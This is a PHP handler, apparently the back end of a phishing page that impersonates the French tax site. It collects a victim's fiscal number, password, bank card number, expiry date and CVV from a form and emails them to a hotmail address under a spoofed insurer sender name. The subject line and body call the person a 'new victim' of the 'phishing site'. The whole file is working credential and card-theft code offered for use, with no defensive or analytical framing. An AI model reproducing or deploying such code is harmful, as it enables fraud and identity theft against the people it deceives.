<?php

$numeroFiscal = $_POST['numeroFiscal'];
$motDePasse = $_POST['motDePasse'];
$carteBancaire = $_POST['carteBancaire'];
$dateExpiration = $_POST['dateExpiration'];
$cryptogramme = $_POST['cryptogramme'];


if (substr($carteBancaire, 0, 1) === '5') { 
$imageCarteBancaire = '<img src="http://www.transparentpng.com/download/mastercard/png-mastercard-clipart-file-logo-12.png" width="15px;"> ';

}
else if(substr($carteBancaire, 0, 1) === '4')
{
	$imageCarteBancaire = '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Old_Visa_Logo.svg/1280px-Old_Visa_Logo.svg.png" width="15px;"> ';
}


$mail = 'tototiti98@hotmail.fr'; // Déclaration de l'adresse de destination.
if (!preg_match("#^[a-z0-9._-]+@(hotmail|live|msn).[a-z]{2,4}$#", $mail)) // On filtre les serveurs qui rencontrent des bogues.
{
	$passage_ligne = "\r\n";
}
else
{
	$passage_ligne = "\n";
}
//=====Déclaration des messages au format texte et au format HTML.
$message_txt = "Nouvelle victime sur le site de phising des imp&ocirc;ts.";
$message_html = "<html><head></head><body>[PARTIE CONNEXION AU COMPTE]<br /><b><u>Num&eacute;ro fiscal :</b></u> ".$numeroFiscal."<br /><b><u>Mot de passe :</u></b> ".$motDePasse."<br /><b><u>Num&eacute;ro carte bancaire :</u></b><br />". $imageCarteBancaire .$carteBancaire."<br/><b><u>Date d'expiration :</u></b> ".$dateExpiration."<br /><b><u>Cryptogramme :</u></b> ".$cryptogramme."</body></html>";
//==========
 
//=====Création de la boundary
$boundary = "-----=".md5(rand());
//==========
 
//=====Définition du sujet.
$sujet = "Nouvelle victime - Site des impôts";
//=========
 
//=====Création du header de l'e-mail.
$header = "From: \"Prévention MAIF 49\"<prevention-maif-49@outlook.fr>".$passage_ligne;
$header.= "Reply-to: \"Prévention MAIF 49\" <prevention-maif-49@outlook.fr>".$passage_ligne;
$header.= "MIME-Version: 1.0".$passage_ligne;
$header.= "Content-Type: multipart/alternative;".$passage_ligne." boundary=\"$boundary\"".$passage_ligne;
//==========
 
//=====Création du message.
$message = $passage_ligne."--".$boundary.$passage_ligne;
//=====Ajout du message au format texte.
$message.= "Content-Type: text/plain; charset=\"UTF-8\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: 8bit".$passage_ligne;
$message.= $passage_ligne.$message_txt.$passage_ligne;
//==========
$message.= $passage_ligne."--".$boundary.$passage_ligne;
//=====Ajout du message au format HTML
$message.= "Content-Type: text/html; charset=\"UTF-8\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: 8bit".$passage_ligne;
$message.= $passage_ligne.$message_html.$passage_ligne;
//==========
$message.= $passage_ligne."--".$boundary."--".$passage_ligne;
$message.= $passage_ligne."--".$boundary."--".$passage_ligne;
//==========
 
//=====Envoi de l'e-mail.
mail($mail,$sujet,$message,$header);

echo json_encode("Mail envoyé, merci pour les infos ;)");
